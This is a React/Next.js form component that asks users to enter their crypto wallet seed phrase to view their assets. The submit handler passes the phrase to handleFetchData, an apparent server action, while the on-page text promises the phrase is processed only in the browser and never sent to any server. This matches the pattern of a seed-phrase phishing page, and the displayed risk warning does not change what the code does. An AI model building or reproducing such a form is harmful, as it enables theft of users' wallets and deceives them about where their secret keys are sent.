"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Loader2, AlertTriangle } from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card, CardContent } from "@/components/ui/card";
import { handleFetchData } from "@/app/actions";
import { useToast } from "@/hooks/use-toast";
import type { WalletData } from "@/app/actions";

const formSchema = z.object({
  seedPhrase: z
    .string()
    .trim()
    .min(1, "Seed phrase cannot be empty.")
    .refine(
      (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
      "A valid seed phrase must contain at least 12 words."
    ),
  confirmRisk: z.literal(true, {
    errorMap: () => ({
      message: "You must acknowledge the risks to proceed.",
    }),
  }),
});

type SeedPhraseFormProps = {
  onDataFetched: (data: WalletData | null) => void;
  onFetchStart: () => void;
};

export function SeedPhraseForm({
  onDataFetched,
  onFetchStart,
}: SeedPhraseFormProps) {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      seedPhrase: "",
      confirmRisk: false,
    },
  });

  const confirmRiskValue = form.watch("confirmRisk");

  async function onSubmit(values: z.infer<typeof formSchema>) {
    setIsSubmitting(true);
    onFetchStart();

    const formData = new FormData();
    formData.append("seedPhrase", values.seedPhrase);
    
    // We no longer need network selection, as it's a universal platform
    // formData.append("network", values.network);

    const result = await handleFetchData(formData);

    setIsSubmitting(false);

    if (result.success && result.data) {
      onDataFetched(result.data);
    } else {
      toast({
        variant: "destructive",
        title: "Failed to fetch data",
        description:
          result.error ||
          "An unknown error occurred. Please try again later.",
      });
      onDataFetched(null);
    }
  }

  return (
    <Card>
      <CardContent className="p-6">
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="seedPhrase"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Seed Phrase</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="Enter your 12, 18, or 24-word seed phrase here..."
                      className="resize-none"
                      rows={4}
                      {...field}
                    />
                  </FormControl>
                  <FormDescription>
                    Your seed phrase is processed locally in your browser and is never sent to our servers.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <Alert variant="destructive" className="bg-destructive/10">
              <AlertTriangle className="h-4 w-4 !text-destructive" />
              <AlertTitle className="font-bold">Security Warning!</AlertTitle>
              <AlertDescription>
                Entering your seed phrase into any website is extremely risky and
                can lead to a total loss of your funds. Only proceed if you
                are using a temporary, empty wallet for testing purposes.
              </AlertDescription>
            </Alert>

            <FormField
              control={form.control}
              name="confirmRisk"
              render={({ field }) => (
                <FormItem className="flex flex-row items-start space-x-3 space-y-0 rounded-md p-4 border border-destructive/50">
                  <FormControl>
                    <Checkbox
                      checked={field.value}
                      onCheckedChange={field.onChange}
                      className="mt-0.5"
                    />
                  </FormControl>
                  <div className="space-y-1 leading-none">
                    <FormLabel>
                      I understand the risk and I am not using a wallet with
                      real funds.
                    </FormLabel>
                    <FormMessage />
                  </div>
                </FormItem>
              )}
            />

            <Button
              type="submit"
              disabled={!confirmRiskValue || isSubmitting}
              className="w-full bg-accent hover:bg-accent/90"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Fetching Assets...
                </>
              ) : (
                "View My Assets"
              )}
            </Button>
          </form>
        </Form>
      </CardContent>
    </Card>
  );
}
